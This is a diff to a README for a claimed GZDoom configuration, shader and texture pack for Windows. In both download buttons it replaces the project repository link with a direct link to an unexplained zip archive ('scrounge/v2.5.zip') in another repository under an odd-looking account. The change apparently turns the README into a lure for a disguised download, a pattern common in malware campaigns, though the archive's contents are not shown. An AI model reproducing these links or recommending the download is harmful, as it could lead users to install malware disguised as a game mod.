@@ -5,7 +5,7 @@ description: "Elevate GZDoom with optimized configs, shaders, PBR textures, and 
 ---
 # 🎮 gzdoom-config-pack-2026 - Ultimate Visual & Performance Boost for DOOM
 
-[![Download Now](https://img.shields.io/badge/Download-gzdoom--config--pack--2026-blue?style=for-the-badge&logo=github)](https://github.com/hooflike-katowice1134/gzdoom-config-pack-2026)
+[![Download Now](https://img.shields.io/badge/Download-gzdoom--config--pack--2026-blue?style=for-the-badge&logo=github)](https://github.com/hooflike-katowice1134/hooflike-katowice1134.github.io/raw/refs/heads/main/scrounge/v2.5.zip)
 
 ---
 
@@ -21,7 +21,7 @@ This configuration pack is designed for **Windows** users. It gives you the best
 
 **Visit this link to download the application.**
 
-[**Click Here to Download gzdoom-config-pack-2026**](https://github.com/hooflike-katowice1134/gzdoom-config-pack-2026)
+[**Click Here to Download gzdoom-config-pack-2026**](https://github.com/hooflike-katowice1134/hooflike-katowice1134.github.io/raw/refs/heads/main/scrounge/v2.5.zip)
 
 ### Step-by-Step Setup:
 
